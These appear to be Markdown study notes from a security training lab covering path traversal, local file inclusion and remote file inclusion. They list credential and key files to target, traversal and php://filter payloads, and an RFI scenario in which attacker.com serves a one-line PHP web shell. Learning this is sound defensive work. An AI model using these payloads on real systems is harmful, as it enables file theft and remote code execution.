Here are some concise, organized notes formatted for **Obsidian**. You can copy and paste these directly into a new `.md` file.

---

# 📂 Path Traversal (Directory Traversal)

### 📌 Definition

A web security vulnerability that allows an attacker to read operating system resources (local files) by manipulating a URL to access directories outside the web root.

### ⚙️ Mechanism

- **The "Dot-Dot-Slash" (`../`) Attack:** Used to "climb" out of the application’s folder and reach the root directory (`/`).
    
- **Root Cause:** Poor input validation/filtering when passing user data to file-system functions (e.g., `file_get_contents` in PHP).
    
- **Typical Entry Point:** URL parameters like `?file=`, `?path=`, or `?document=`.
    

---

### 📑 Key Target Files

#### **Linux Systems**

|**File Path**|**Description**|
|---|---|
|`/etc/passwd`|List of system users.|
|`/etc/shadow`|Encrypted user passwords (requires root).|
|`/etc/issue`|System identification/banner.|
|`/proc/version`|Kernel version information.|
|`/root/.bash_history`|History of commands run by the root user.|
|`/var/log/apache2/access.log`|Apache web server access logs.|
|`/root/.ssh/id_rsa`|Private SSH keys (critical exposure).|

#### **Windows Systems**

|**File Path**|**Description**|
|---|---|
|`C:\boot.ini`|Boot options for older systems.|
|`C:\windows\win.ini`|Legacy system configuration file.|
|`C:\Windows\System32\drivers\etc\hosts`|Local DNS mappings.|

---

### 🛠️ Payload Examples

- **Linux:** `http://site.thm/get.php?file=../../../../etc/passwd`
    
- **Windows:** `http://site.thm/get.php?file=../../../../windows/win.ini`
![[img/Pasted image 20251224220156.png]]
## 🟢 Local File Inclusion (LFI)

LFI is the process of tricking a web application into exposing or running files on the local server. While Path Traversal is about **reading** files, LFI can often lead to **executing** code.

### ⚙️ Common LFI Techniques

- **Basic Bypass:** If the app appends an extension (e.g., `.php`), attackers may use a **Null Byte** `%00` (in older PHP versions) to terminate the string.
    
- **Path Truncation:** Overloading the path with `.` or `/` to force the app to drop the suffix.
    
- **PHP Wrappers:**
    
    - `php://filter`: Used to encode files in base64 (useful for reading source code without executing it).
        
        - _Example:_ `?file=php://filter/convert.base64-encode/resource=config.php`
            
    - `php://input`: Used to pass raw POST data as code execution.
        

---

## 🔵 Remote File Inclusion (RFI)

RFI allows an attacker to include and execute a file hosted on an **external server**. This is generally more critical than LFI as it leads directly to **Remote Code Execution (RCE)**.

### ⚙️ Requirements (PHP)

For RFI to work, the following must be set to `On` in the `php.ini` configuration:

1. `allow_url_fopen`
    
2. `allow_url_include`
    

### 🛠️ Attack Scenario

1. Attacker hosts a malicious script: `http://attacker.com/shell.txt` (containing `<?php system($_GET['cmd']); ?>`).
    
2. Attacker injects the URL: `http://webapp.thm/index.php?page=http://attacker.com/shell.txt`.
    
3. The server fetches and executes the malicious code.